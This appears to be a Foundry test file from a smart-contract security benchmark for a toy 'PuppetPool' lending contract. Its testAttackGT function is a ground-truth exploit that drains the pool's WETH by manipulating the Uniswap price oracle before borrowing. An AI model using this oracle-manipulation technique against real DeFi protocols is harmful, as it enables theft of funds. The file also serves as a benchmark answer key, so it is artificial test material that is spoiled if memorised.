// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/UniswapV1.sol";

import "benchmarks/toy/PuppetPool/PuppetPool.sol";
import "benchmarks/toy/PuppetPool/Handler.sol";

contract PuppetPoolTest is Test {
    address constant owner = address(0xdeadbeef);
    address attacker;

    ERC20Basic token;
    WETH weth;
    UniswapV1 uniswap;
    PuppetPool puppetpool;
    PuppetPoolHandler handler;

    uint256 public constant totalSupply = 1000 ether;
    uint256 public constant feeRate = 15;

    uint256 public constant attackerInitBalance = 10 ether;
    uint256 public constant attackerInitToken = 10 ether;

    uint256 public constant uniswapInitBalance = 10 ether;
    uint256 public constant uniswapInitToken = 10 ether;

    uint256 public constant puppetpoolInitBalance = 100 ether;

    uint256 public constant requiredBalance =
        puppetpoolInitBalance + attackerInitBalance;

    function setUp() public {
        attacker = address(this);

        vm.startPrank(owner);
        token = new ERC20Basic(totalSupply);
        weth = new WETH(totalSupply);
        uniswap = new UniswapV1(address(token), address(weth), feeRate);
        puppetpool = new PuppetPool(
            address(token),
            address(weth),
            address(uniswap)
        );
        handler = new PuppetPoolHandler(
            owner,
            attacker,
            address(token),
            address(weth),
            address(uniswap),
            address(puppetpool)
        );
        token.transfer(attacker, attackerInitToken);
        token.transfer(address(uniswap), uniswapInitToken);

        weth.transfer(attacker, attackerInitBalance);
        weth.transfer(address(uniswap), uniswapInitBalance);
        weth.transfer(address(puppetpool), puppetpoolInitBalance);
        vm.stopPrank();

        excludeContract(address(token));
        excludeContract(address(weth));
        excludeContract(address(uniswap));
        excludeContract(address(puppetpool));
    }

    function testAttackGT() public {
        weth.approve(address(uniswap), UINT256_MAX);
        uniswap.swapWETHToToken(attackerInitBalance);

        token.approve(address(puppetpool), UINT256_MAX);
        puppetpool.borrowWETH(puppetpoolInitBalance);
        
        token.approve(address(uniswap), UINT256_MAX);
        uniswap.swapTokenToWETH(token.balanceOf(attacker));
        require(attackGoal(), "Attack Failed!");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= requiredBalance;
    }

    // function invariantSafe() public view {
    //     assert(!attackGoal());
    // }
}
